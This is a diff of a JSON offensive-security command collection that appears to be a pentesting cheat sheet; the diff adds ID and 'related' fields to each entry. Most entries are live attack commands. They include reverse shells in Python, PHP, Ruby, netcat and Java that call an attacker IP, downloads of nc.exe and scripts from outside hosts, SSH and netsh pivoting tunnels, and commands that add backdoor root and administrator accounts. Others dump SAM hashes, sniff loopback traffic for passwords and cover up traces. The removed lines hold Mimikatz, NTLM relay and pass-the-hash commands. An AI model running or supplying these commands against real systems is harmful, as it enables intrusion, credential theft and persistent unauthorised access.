       "Description": "A Python reverse shell for Linux with Python 2.7, connecting to a specified IP and port checkout https://www.revshells.com for more robust shell creation",
       "Command": "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.1.100\",2234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
-      "OS": "Win/Lin"
+      "OS": "Win/Lin",
+      "id": 170,
+      "related": [
+        166,
+        167,
+        168,
+        169,
+        171
+      ]
     },
     {
       "Name": "PHP Reverse Shell",
       "Category": 10,
       "Description": "A PHP reverse shell assuming TCP connection uses file descriptor 3 (try 4, 5, 6 if needed) checkout https://www.revshells.com for more robust shell creation",
       "Command": "php -r '$sock=fsockopen(\"192.168.1.100\",2234);exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
-      "OS": "Win/Lin"
+      "OS": "Win/Lin",
+      "id": 171,
+      "related": [
+        166,
+        167,
+        168,
+        169,
+        170
+      ]
     },
     {
       "Name": "Ruby Reverse Shell",
       "Category": 10,
       "Description": "A Ruby reverse shell connecting to a specified IP and port checkout https://www.revshells.com for more robust shell creation",
       "Command": "ruby -rsocket -e'f=TCPSocket.open(\"192.168.1.100\",2234).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
-      "OS": "Win/Lin"
+      "OS": "Win/Lin",
+      "id": 172,
+      "related": [
+        171,
+        173,
+        174,
+        175,
+        176
+      ]
     },
     {
       "Name": "Netcat Reverse Shell",
       "Category": 10,
       "Description": "A Netcat reverse shell, requires -e option support checkout https://www.revshells.com for more robust shell creation",
       "Command": "nc -e /bin/sh 192.168.1.100 2234",
-      "OS": "Win/Lin"
+      "OS": "Win/Lin",
+      "id": 173,
+      "related": [
+        171,
+        172,
+        174,
+        175,
+        176
+      ]
     },
     {
       "Name": "Netcat FIFO Shell",
       "Category": 10,
       "Description": "An alternative Netcat reverse shell using FIFO for systems without -e option checkout https://www.revshells.com for more robust shell creation",
       "Command": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.1.100 2234 >/tmp/f",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 174,
+      "related": [
+        171,
+        172,
+        173,
+        175,
+        176
+      ]
     },
     {
       "Name": "Java Reverse Shell",
       "Category": 10,
       "Description": "A Java reverse shell connecting to a specified IP and port (untested) checkout https://www.revshells.com for more robust shell creation",
       "Command": "r = Runtime.getRuntime(); p = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/192.168.1.100/3002;cat <&5 | while read line; do \\$line 2>&5 >&5; done\"] as String[]); p.waitFor()",
-      "OS": "Win/Lin"
+      "OS": "Win/Lin",
+      "id": 175,
+      "related": [
+        171,
+        172,
+        173,
+        174,
+        176
+      ]
     },
     {
       "Name": "Xterm Reverse Shell",
       "Category": 10,
       "Description": "An xterm reverse shell connecting to a specified IP on port 6001 checkout https://www.revshells.com for more robust shell creation",
       "Command": "xterm -display 192.168.1.100:2",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 176,
+      "related": [
+        171,
+        172,
+        173,
+        174,
+        175
+      ]
     },
     {
       "Name": "Start Xnest Server",
       "Category": 10,
       "Description": "Starts an X-Server to catch incoming xterm on port 6001 (run on your system) checkout https://www.revshells.com for more robust shell creation",
       "Command": "Xnest :2",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 177,
+      "related": [
+        176,
+        178,
+        179,
+        180,
+        181
+      ]
     },
     {
       "Name": "Authorize Xhost Target",
       "Category": 10,
       "Description": "Authorizes the target to connect to your X-Server (run on your system)",
       "Command": "xhost +targetip",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 178,
+      "related": [
+        176,
+        177,
+        179,
+        180,
+        181
+      ]
     },
     {
       "Name": "SSH Dynamic SOCKS Proxy",
       "Category": 9,
       "Description": "Create a dynamic SOCKS proxy via SSH on local port 9999 for routing traffic through a compromised host, aiding in anonymous pivoting after Linux privilege escalation.",
       "Command": "ssh -N -D 0.0.0.0:8888 dbadmin@10.5.179.216",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 179,
+      "related": [
+        176,
+        177,
+        178,
+        180,
+        181
+      ]
     },
     {
       "Name": "SSH Remote SSH Forward",
       "Category": 9,
       "Description": "Configure an SSH remote port forward to expose a local SSH service on the remote host's port 2222, enabling inbound connections for further exploitation in Linux post-exploitation.",
       "Command": "ssh -N -R 127.0.0.1:3333:10.5.51.216:23 kali@192.169.119.5",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 180,
+      "related": [
+        176,
+        177,
+        178,
+        179,
+        181
+      ]
     },
     {
       "Name": "SSH Remote Proxy Forward",
       "Category": 9,
       "Description": "Initiate an SSH remote port forward on port 9997 for proxy chaining, supporting persistent access and tool routing in Linux privilege escalation scenarios.",
       "Command": "ssh -N -R 8886 kali@192.169.46.160 #remember to update proxy chains to 127.0.0.1 8886",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 181,
+      "related": [
+        176,
+        177,
+        178,
+        179,
+        180
+      ]
     },
     {
       "Name": "SSHuttle Subnet Tunnel",
       "Category": 9,
       "Description": "Deploy sshuttle to create a VPN-like tunnel over SSH for specified subnets, allowing seamless traffic routing and lateral movement post-Linux escalation.",
       "Command": "sshuttle -r database_admin@192.169.51.64:3333 10.5.179.0/24 172.17.179.0/24",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 182,
+      "related": [
+        181,
+        183,
+        184,
+        185,
+        186
+      ]
     },
     {
       "Name": "SSH Basic Remote Forward",
       "Category": 9,
       "Description": "Establish a basic SSH remote port forward on port 9997 to bridge networks and maintain access channels during Linux post-exploitation activities.",
       "Command": "ssh -N -R 8886 kali@192.169.46.160",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 183,
+      "related": [
+        181,
+        182,
+        184,
+        185,
+        186
+      ]
     },
     {
       "Name": "Plink RDP Port Forward",
       "Category": 17,
       "Description": "Use Plink to set up a remote port forward for RDP on port 9833, enabling Windows lateral movement from a Linux-compromised pivot in mixed-environment priv-esc chains.",
       "Command": "plink.exe -ssh -l kali -pw kali -R 127.0.0.1:8722:127.0.0.1:4490 192.169.46.160",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 184,
+      "related": [
+        181,
+        182,
+        183,
+        185,
+        186
+      ]
     },
     {
       "Name": "Download Netcat Executable",
       "Category": 17,
       "Description": "Download a netcat executable to a Windows temp directory using PowerShell wget, preparing for reverse shell or scanning tools in cross-platform Linux-to-Windows escalation.",
       "Command": "wget -Uri http://192.169.46.160/nc.exe -OutFile C:\\Windows\\Temp\\nc.exe",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 185,
+      "related": [
+        181,
+        182,
+        183,
+        184,
+        186
+      ]
     },
     {
       "Name": "Add Windows Port Proxy",
       "Category": 17,
       "Description": "Configure a Windows port proxy rule with netsh to forward traffic from local port 4545 to a remote host, supporting tunneling in post-exploitation from Linux pivots.",
       "Command": "netsh interface portproxy add v4tov4 listenport=5656 listenaddress=192.169.179.65 connectport=5656 connectaddress=10.5.179.216",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 186,
+      "related": [
+        181,
+        182,
+        183,
+        184,
+        185
+      ]
     },
     {
       "Name": "List Windows Port Proxies",
       "Category": 17,
       "Description": "Display all configured port proxy rules on Windows to verify forwarding setups during mixed Linux-Windows privilege escalation verification.",
       "Command": "netsh interface portproxy show all",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 187,
+      "related": [
+        186,
+        188,
+        189,
+        190,
+        191
+      ]
     },
     {
       "Name": "Check Specific Port Status",
       "Category": 14,
       "Description": "Examine network connections for a specific port (4545) using netstat to confirm listening services in Linux post-exploitation network enumeration.",
       "Command": "netstat -anp TCP | find \"5656\"",
-      "OS": "Win/Lin"
+      "OS": "Win/Lin",
+      "id": 188,
+      "related": [
+        186,
+        187,
+        189,
+        190,
+        191
+      ]
     },
     {
       "Name": "Add Windows Firewall Rule",
       "Category": 17,
       "Description": "Add an inbound Windows firewall rule to allow TCP traffic on port 4545, ensuring port forwards remain accessible in Linux-initiated lateral attacks.",
       "Command": "netsh advfirewall firewall add rule name=\"port_forward_ssh_5656\" protocol=TCP dir=in localip=192.169.179.65 localport=5656 action=allow",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 189,
+      "related": [
+        186,
+        187,
+        188,
+        190,
+        191
+      ]
     },
     {
       "Name": "Delete Windows Firewall Rule",
       "Category": 17,
       "Description": "Remove a specific Windows firewall rule to clean up traces of port forwarding configurations after testing in a Linux priv-esc engagement.",
       "Command": "netsh advfirewall firewall delete rule name=\"port_forward_ssh_5656\"",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 190,
+      "related": [
+        186,
+        187,
+        188,
+        189,
+        191
+      ]
     },
     {
       "Name": "Delete Windows Port Proxy",
       "Category": 17,
       "Description": "Delete a Windows port proxy rule to dismantle forwarding setups and maintain operational security post-Linux privilege escalation activities.",
       "Command": "netsh interface portproxy del v4tov4 listenport=5656 listenaddress=192.169.179.65",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 191,
+      "related": [
+        186,
+        187,
+        188,
+        189,
+        190
+      ]
     },
     {
       "Name": "Check Current User ID",
       "Category": 9,
       "Description": "Enumerate current user ID, groups, and privileges to identify initial access level and potential escalation paths in a compromised Linux environment.",
       "Command": "id",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 192,
+      "related": [
+        191,
+        193,
+        194,
+        195,
+        196
+      ]
     },
     {
       "Name": "Get System Hostname",
       "Category": 0,
       "Description": "Retrieve the system's hostname for mapping the target during initial reconnaissance in privilege escalation assessments.",
       "Command": "hostname",
-      "OS": "Win/Lin"
+      "OS": "Win/Lin",
+      "id": 193,
+      "related": [
+        191,
+        192,
+        194,
+        195,
+        196
+      ]
     },
     {
       "Name": "Read Login Banner",
       "Category": 0,
       "Description": "Display the login banner from /etc/issue to gather OS and environment details passively for targeted Linux priv-esc planning.",
       "Command": "cat /etc/issue",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 194,
+      "related": [
+        191,
+        192,
+        193,
+        195,
+        196
+      ]
     },
     {
       "Name": "Get OS Release Info",
       "Category": 0,
       "Description": "Extract distribution and version information from /etc/os-release to identify potential vulnerabilities and exploit compatibility in Linux systems.",
       "Command": "cat /etc/os-release",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 195,
+      "related": [
+        191,
+        192,
+        193,
+        194,
+        196
+      ]
     },
     {
       "Name": "Show Kernel Details",
       "Category": 0,
       "Description": "Output kernel version, architecture, and build details via uname to scout for known kernel exploits during passive mapping.",
       "Command": "uname -a",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 196,
+      "related": [
+        191,
+        192,
+        193,
+        194,
+        195
+      ]
     },
     {
       "Name": "Display Route Table",
       "Category": 3,
       "Description": "Display routing table interactively to map network topology and identify lateral movement opportunities in a Linux target.",
       "Command": "routel",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 197,
+      "related": [
+        196,
+        198,
+        199,
+        200,
+        201
+      ]
     },
     {
       "Name": "List IP Addresses",
       "Category": 3,
       "Description": "Enumerate all network interfaces and IP configurations for interactive network mapping and pivot identification in priv-esc chains.",
       "Command": "ip a",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 198,
+      "related": [
+        196,
+        197,
+        199,
+        200,
+        201
+      ]
     },
     {
       "Name": "Dump IPTables Rules",
       "Category": 14,
       "Description": "Dump IPv4 firewall rules to assess network restrictions and potential bypasses in a Linux post-exploitation scenario.",
       "Command": "cat /etc/iptables/rules.v4",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 199,
+      "related": [
+        196,
+        197,
+        198,
+        200,
+        201
+      ]
     },
     {
       "Name": "List Cron Directories",
       "Category": 9,
       "Description": "List cron job directories and files to uncover scheduled tasks that may allow privilege escalation via writable cron entries.",
       "Command": "ls -lah /etc/cron*",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 200,
+      "related": [
+        201,
+        202,
+        203,
+        204,
+        205
+      ]
     },
     {
       "Name": "List User Crontab",
       "Category": 9,
       "Description": "Display current user's crontab entries to identify automated jobs exploitable for persistent or elevated access in Linux environments.",
       "Command": "crontab -l",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 201,
+      "related": [
+        200,
+        202,
+        203,
+        204,
+        205
+      ]
     },
     {
       "Name": "List Installed Packages",
       "Category": 9,
       "Description": "List all installed Debian packages to analyze application versions for known vulnerabilities in priv-esc reconnaissance.",
       "Command": "dpkg -l",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 202,
+      "related": [
+        200,
+        201,
+        203,
+        204,
+        205
+      ]
     },
     {
       "Name": "Find Writable Directories",
       "Category": 9,
       "Description": "Find world-writable directories across the filesystem to locate upload points for malicious payloads in post-exploitation.",
       "Command": "find / -writable -type d 2>/dev/null",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 203,
+      "related": [
+        200,
+        201,
+        202,
+        204,
+        205
+      ]
     },
     {
       "Name": "List Mount Points",
       "Category": 9,
       "Description": "Examine filesystem mount table to identify mounted volumes, shares, and potential noexec bypasses for escalation techniques.",
       "Command": "cat /etc/fstab",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 204,
+      "related": [
+        200,
+        201,
+        202,
+        203,
+        205
+      ]
     },
     {
       "Name": "List Block Devices",
       "Category": 9,
       "Description": "List block devices and partitions to map storage layout and detect encrypted or hidden volumes in Linux priv-esc.",
       "Command": "lsblk",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 205,
+      "related": [
+        200,
+        201,
+        202,
+        203,
+        204
+      ]
     },
     {
       "Name": "List Loaded Modules",
       "Category": 9,
       "Description": "Enumerate loaded kernel modules to spot drivers vulnerable to exploits or version-specific weaknesses.",
       "Command": "lsmod",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 206,
+      "related": [
+        205,
+        207,
+        208,
+        209,
+        210
+      ]
     },
     {
       "Name": "Query Module Info",
       "Category": 14,
       "Description": "Query details on the libata kernel module to assess for storage-related exploits in targeted priv-esc paths.",
       "Command": "/sbin/modinfo libata",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 207,
+      "related": [
+        205,
+        206,
+        208,
+        209,
+        210
+      ]
     },
     {
       "Name": "Find SUID Binaries",
       "Category": 9,
       "Description": "Locate setuid executables system-wide to identify privilege escalation vectors via misconfigured SUID files.",
       "Command": "find / -perm -u=s -type f 2>/dev/null",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 208,
+      "related": [
+        205,
+        206,
+        207,
+        209,
+        210
+      ]
     },
     {
       "Name": "Dump Environment Variables",
       "Category": 9,
       "Description": "Dump environment variables to reveal paths, credentials, or configs exploitable for further escalation in Linux shells.",
       "Command": "env",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 209,
+      "related": [
+        205,
+        206,
+        207,
+        208,
+        210
+      ]
     },
     {
       "Name": "List Sudo Permissions",
       "Category": 8,
       "Description": "List allowed sudo commands to scout for misconfigurations enabling initial privilege escalation attempts.",
       "Command": "sudo -l",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 210,
+      "related": [
+        205,
+        206,
+        207,
+        208,
+        209
+      ]
     },
     {
       "Name": "Attempt Root Shell",
       "Category": 8,
       "Description": "Attempt interactive root shell via sudo for direct privilege escalation if permissions allow.",
       "Command": "sudo -i",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 211,
+      "related": [
+        210,
+        212,
+        213,
+        214,
+        215
+      ]
     },
     {
       "Name": "Monitor Running Processes",
       "Category": 9,
       "Description": "Continuously watch processes for user related activity during post-exploitation sniffing.",
       "Command": "watch -n 1 \"ps -aux | grep '\\['\"",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 212,
+      "related": [
+        210,
+        211,
+        213,
+        214,
+        215
+      ]
     },
     {
       "Name": "Sniff Loopback Traffic",
       "Category": 9,
       "Description": "Use sudo to capture and grep loopback traffic for plaintext passwords in local inter-process communications.",
       "Command": "sudo tcpdump -i lo -A | grep \"pass\"",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 213,
+      "related": [
+        210,
+        211,
+        212,
+        214,
+        215
+      ]
     },
     {
       "Name": "Search Cron Logs",
       "Category": 9,
       "Description": "Search syslog for cron execution logs to correlate scheduled jobs with potential escalation timestamps.",
       "Command": "grep \"CRON\" /var/log/syslog",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 214,
+      "related": [
+        210,
+        211,
+        212,
+        213,
+        215
+      ]
     },
     {
       "Name": "Add Backdoor User",
       "Category": 9,
       "Description": "Append a new root-equivalent user to /etc/passwd for persistent backdoor access post-privilege escalation.",
       "Command": "echo \"mrtheplague:$(openssl passwd x): 0: 0:root:/root:/bin/bash\" >> /etc/passwd",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 215,
+      "related": [
+        210,
+        211,
+        212,
+        213,
+        214
+      ]
     },
     {
       "Name": "List File Capabilities",
       "Category": 9,
       "Description": "Recursively enumerate file capabilities to uncover binaries with elevated privileges without traditional SUID.",
       "Command": "/usr/sbin/getcap -r / 2>/dev/null",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 216,
+      "related": [
+        215,
+        217,
+        218,
+        219,
+        220
+      ]
     },
     {
       "Name": "Get Kernel Version",
       "Category": 0,
       "Description": "Extract kernel release version for passive identification of exploitable kernel flaws in Linux mapping.",
       "Command": "uname -r",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 217,
+      "related": [
+        215,
+        216,
+        218,
+        219,
+        220
+      ]
     },
     {
       "Name": "Get System Architecture",
       "Category": 0,
       "Description": "Determine system architecture to tailor exploits and payloads for architecture-specific vulnerabilities.",
       "Command": "arch",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 218,
+      "related": [
+        215,
+        216,
+        217,
+        219,
+        220
+      ]
     },
     {
       "Name": "Check File Type",
       "Category": 14,
       "Description": "Identify file type of a test file to verify binaries or scripts for exploitation in misc Linux priv-esc tasks.",
       "Command": "file test-file",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 219,
+      "related": [
+        215,
+        216,
+        217,
+        218,
+        220
+      ]
     },
     {
       "Name": "Save SAM System Files",
       "Category": 17,
       "Description": "Save SAM and SYSTEM files",
       "Command": "reg save HKLM\\sam sam2 &&  reg save HKLM\\system system2",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 220,
+      "related": [
+        215,
+        216,
+        217,
+        218,
+        219
+      ]
     },
     {
       "Name": "List Non-System32 Services",
       "Category": 17,
       "Description": "List all services that aren't in the System32 directory",
       "Command": "for /f \"tokens=2 delims=: \" %s in ('sc query state^= all ^| find \"SERVICE_NAME\"') do @sc qc \"%s\" | find \"BINARY_PATH_NAME\" | findstr /v /i \"System32\"",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 221,
+      "related": [
+        220,
+        222,
+        223,
+        224,
+        225
+      ]
     },
     {
       "Name": "Create Backdoor Admin",
       "Category": 17,
       "Description": "Create a windows backdoor admin account",
       "Command": "net user mrtheplague 'password1234!!' /add; net localgroup Administrators mrtheplague /add",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 222,
+      "related": [
+        220,
+        221,
+        223,
+        224,
+        225
+      ]
     },
     {
       "Name": "List User Scheduled Tasks",
       "Category": 17,
       "Description": "List all scheduled tasks that have executables under C:\\Users*",
       "Command": "schtasks /query /fo CSV /v | ConvertFrom-Csv | Where-Object { $_.\"Task To Run\" -Like \"C:\\Users*\" -and $_.\"TaskName\" -ne \"\" -and $_.\"TaskName\" -ne \"TaskName\" }",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 223,
+      "related": [
+        220,
+        221,
+        222,
+        224,
+        225
+      ]
     },
     {
       "Name": "List Unquoted Path Services",
       "Category": 17,
       "Description": "List all services that have unquoted paths",
       "Command": "wmic service get name,pathname |  Select-string -NotMatch \"Windows\" | Select-string -NotMatch -Pattern '\"' | Where-Object {  -not [String]::IsNullOrEmpty($_) }",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 224,
+      "related": [
+        220,
+        221,
+        222,
+        223,
+        225
+      ]
     },
     {
       "Name": "Download File PowerShell",
       "Category": 15,
       "Description": "Download file to windows",
       "Command": "iwr -uri http://192.169.49.4/file.ps1 -Outfile file",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 225,
+      "related": [
+        220,
+        221,
+        222,
+        223,
+        224
+      ]
     },
     {
       "Name": "Download File Certutil",
       "Category": 17,
       "Description": "Download file to windows",
-      "Command": "certutil -UrlCache -f http://host.com/file .\\file",
-      "OS": "Windows"
+      "Command": "certutil -urlfetch -f http://host.com/file.exe file.exe",
+      "OS": "Windows",
+      "id": 226,
+      "related": [
+        225,
+        227,
+        228,
+        229,
+        230
+      ]
     },
     {
       "Name": "List Network Connections",
       "Category": 17,
       "Description": "List all active network connections and listening ports",
       "Command": "netstat -ano",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 227,
+      "related": [
+        225,
+        226,
+        228,
+        229,
+        230
+      ]
     },
     {
       "Name": "Display Routing Table",
       "Category": 17,
       "Description": "Display the routing table, which contains all routes of the system",
       "Command": "route print",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 228,
+      "related": [
+        225,
+        226,
+        227,
+        229,
+        230
+      ]
     },
     {
       "Name": "Display System Information",
       "Category": 17,
       "Description": "Display windows system information",
       "Command": "systeminfo",
-      "OS": "Windows"
-    },
-    {
-      "Name": "Dump Hashes Secretsdump",
-      "Category": 9,
-      "Description": "Dump hashes from sam and system files",
-      "Command": "impacket-secretsdump -sam sam -system system local",
-      "OS": "Linux"
-    },
-    {
-      "Name": "Execute NTLM Relay",
-      "Category": 9,
-      "Description": "Execute ntlm smb relay attack",
-      "Command": "sudo impacket-ntlmrelayx --no-http-server -smb2support -t 192.169.214.212 -c 'your windows command'",
-      "OS": "Linux"
-    },
-    {
-      "Name": "Execute PsExec Hash",
-      "Category": 9,
-      "Description": "Execute psexec on remote machine using NTLM hash Mimikatz",
-      "Command": "impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b administrator@192.169.214.213",
-      "OS": "Linux"
-    },
-    {
-      "Name": "Elevate System Token Mimikatz",
-      "Category": 16,
-      "Description": "Elevate to SYSTEM user privileges",
-      "Command": "token::elevate",
-      "OS": "Windows"
-    },
-    {
-      "Name": "Enable Debug Privilege Mimikatz",
-      "Category": 16,
-      "Description": "Enable SeDebugPrivilege access right",
-      "Command": "privilege::debug",
-      "OS": "Windows"
-    },
-    {
-      "Name": "Dump SAM Hashes Mimikatz",
-      "Category": 16,
-      "Description": "Extract the NTLM hashes from the SAM",
-      "Command": "lsadump::sam",
-      "OS": "Windows"
-    },
-    {
-      "Name": "Extract Logon Passwords Mimikatz",
-      "Category": 16,
-      "Description": "Attempts to extract plaintext passwords and password hashes from all available sources",
-      "Command": "sekurlsa::logonpasswords",
-      "OS": "Windows"
-    },
-    {
-      "Name": "List Local Users Powershell",
-      "Category": 15,
-      "Description": "Get Local Users on Windows Powershell",
-      "Command": "Get-LocalUser",
-      "OS": "Windows"
-    },
-    {
-      "Name": "Get Computer Information Powershell",
-      "Category": 15,
-      "Description": "Get Computer Info on Windows",
-      "Command": "Get-ComputerInfo",
-      "OS": "Windows"
-    },
-    {
-      "Name": "List Local Groups Powershell",
-      "Category": 15,
-      "Description": "Get Group Info on Windows",
-      "Command": "Get-LocalGroup",
-      "OS": "Windows"
-    },
-    {
-      "Name": "List Group Members Powershell",
-      "Category": 15,
-      "Description": "Get Group Member Info on Windows",
-      "Command": "Get-LocalGroupMember 'Group Name'",
-      "OS": "Windows"
-    },
-    {
-      "Name": "List 32bit Applications Powershell",
-      "Category": 15,
-      "Description": "List all installed 32bit applications",
-      "Command": "Get-ItemProperty 'HKLM:\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*' | select displayname",
-      "OS": "Windows"
-    },
-    {
-      "Name": "List 64bit Applications Powershell",
-      "Category": 15,
-      "Description": "List all installed 64bit applications",
-      "Command": "Get-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*' | select displayname",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 229,
+      "related": [
+        225,
+        226,
+        227,
+        228,
+        230
+      ]
     },
     {
       "Name": "List Process Paths Powershell",
       "Category": 15,
       "Description": "List all running processes executable paths",
       "Command": "(Get-Process).Path",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 230,
+      "related": [
+        225,
+        226,
+        227,
+        228,
+        229
+      ]
     },
     {
       "Name": "List Running Processes Powershell",
       "Category": 15,
       "Description": "List all running processes",
       "Command": "Get-Process",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 231,
+      "related": [
+        230,
+        232,
+        233,
+        234,
+        235
+      ]
     },
     {
       "Name": "Show PowerShell History Powershell",
       "Category": 15,
       "Description": "Show powershell history for current user",
       "Command": "Get-History",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 232,
+      "related": [
+        230,
+        231,
+        233,
+        234,
+        235
+      ]
     },
     {
       "Name": "Get History Path Powershell",
       "Category": 15,
       "Description": "Show powershell history file path",
       "Command": "(Get-PSReadlineOption).HistorySavePath",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 233,
+      "related": [
+        230,
+        231,
+        232,
+        234,
+        235
+      ]
     },
     {
       "Name": "Search KDBX Files Powershell",
       "Category": 15,
       "Description": "Recursive powershell search by wildcard for extension kdbx",
       "Command": "Get-ChildItem -Path c:\\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 234,
+      "related": [
+        230,
+        231,
+        232,
+        233,
+        235
+      ]
     },
     {
       "Name": "Search Event Logs Powershell",
       "Category": 15,
       "Description": "Search windows events by event ID",
       "Command": "Get-WinEvent -FilterHashtable @{LogName = '*'; Id = 4104} | Select-Object -ExpandProperty Message",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 235,
+      "related": [
+        230,
+        231,
+        232,
+        233,
+        234
+      ]
     },
     {
       "Name": "Grep PowerShell Output Powershell",
       "Category": 15,
       "Description": "Grep powershell command output",
       "Command": "Select-String -Pattern 'search term'",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 236,
+      "related": [
+        235,
+        237,
+        238,
+        239,
+        240
+      ]
     },
     {
       "Name": "Search Common Files Powershell",
       "Category": 15,
       "Description": "Recursive powershell search by wildcard for common extensions",
       "Command": "Get-ChildItem -Path c:\\ -Include *.txt,*.pdf,*.xls,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 237,
+      "related": [
+        235,
+        236,
+        238,
+        239,
+        240
+      ]
     },
     {
       "Name": "List All Services Powershell",
       "Category": 15,
       "Description": "Search for all services, running and stopped, that don't have system32 in the path",
       "Command": "Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.PathName -notlike \"*system32*\"}",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 238,
+      "related": [
+        235,
+        236,
+        237,
+        239,
+        240
+      ]
     },
     {
       "Name": "List Running Services Powershell",
       "Category": 15,
       "Description": "Search for running services that don't have system32 in the path",
       "Command": "Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'} | Where-Object {$_.PathName -notlike \"*system32*\"}",
-      "OS": "Windows"
+      "OS": "Windows",
+      "id": 239,
+      "related": [
+        235,
+        236,
+        237,
+        238,
+        240
+      ]
     },
     {
       "Name": "Start System Service",
       "Category": 9,
       "Description": "Starts a specified service using systemctl",
       "Command": "sudo systemctl start servicename",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 240,
+      "related": [
+        235,
+        236,
+        237,
+        238,
+        239
+      ]
     },
     {
       "Name": "Run Vuln Scan",
       "Category": 5,
       "Description": "Performs vulnerability scan on ports 80 and 443 of 192.168.192.13 using Nmap scripts",
       "Command": "nmap --script vuln -p 80,443 192.168.192.13",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 241,
+      "related": [
+        240,
+        242,
+        243,
+        244,
+        245
+      ]
     },
     {
       "Name": "Scan Web Vulns Nikto",
       "Category": 5,
       "Description": "Vulnerability scanning with nikto",
       "Command": "nikto -h http://targetip:targetport",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 242,
+      "related": [
+        240,
+        241,
+        243,
+        244,
+        245
+      ]
     },
     {
       "Name": "Run Nmap Vuln Scripts",
       "Category": 5,
       "Description": "Vulnerability scanning with nmap scripts",
       "Command": "nmap --script-help=http* -v 10.10.10.12",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 243,
+      "related": [
+        240,
+        241,
+        242,
+        244,
+        245
+      ]
     },
     {
       "Name": "Scan WordPress Vulns",
       "Category": 5,
       "Description": "WordPress security scanner",
       "Command": "wpscan --url http://10.10.10.12/pathtowordpress/",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 244,
+      "related": [
+        240,
+        241,
+        242,
+        243,
+        245
+      ]
     },
     {
       "Name": "Enum Subdomains FFUF",
       "Category": 6,
       "Description": "Subdomain enumeration with ffuf",
       "Command": "ffuf -u http://DOMAIN -w wordlist.txt -H \"Host: FUZZ.DOMAIN\" -s",
-      "OS": "Linux"
+      "OS": "Linux",
+      "id": 245,
+      "related": [
+        240,
+        241,
+        242,
+        243,
+        244
+      ]
     },
     {
       "Name": "Enum Subdomains Wfuzz",
